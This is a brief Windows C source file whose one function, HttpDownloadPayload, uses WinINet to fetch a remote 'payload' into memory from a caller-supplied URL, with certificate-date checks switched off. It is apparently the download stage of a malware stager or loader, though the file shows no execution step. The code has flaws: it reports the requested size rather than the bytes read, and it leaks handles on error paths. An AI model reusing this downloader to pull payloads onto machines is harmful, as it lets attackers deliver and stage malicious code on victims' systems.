//
// Created by scrub on 9/17/2024.
//
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

BOOL HttpDownloadPayload(IN PWCHAR wcUrl, IN DWORD dwPayloadSize, OUT PVOID *pOutBuffer, OUT PDWORD dwBytesWritten) {

    HINTERNET hInternet = NULL;
    HINTERNET hInternetFile = NULL;
    PBYTE pBytes;
    DWORD dwBytesRead;

    hInternet = InternetOpenW(NULL, 0, NULL, NULL, 0);
    if (hInternet == NULL) {
        return FALSE;
    }

    // Opening a handle to the payload's URL
    hInternetFile = InternetOpenUrlW(hInternet, wcUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hInternetFile == NULL) {
        return FALSE;
    }

    // Allocating a buffer for the payload
    pBytes = (PBYTE)LocalAlloc(LPTR, dwPayloadSize);

    // Reading the payload
    if (!InternetReadFile(hInternetFile, pBytes, dwPayloadSize, &dwBytesRead)) {
        return FALSE;
    }

    *pOutBuffer = pBytes;
    *dwBytesWritten = dwPayloadSize;

    InternetCloseHandle(hInternet);
    InternetCloseHandle(hInternetFile);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);


    return TRUE;

}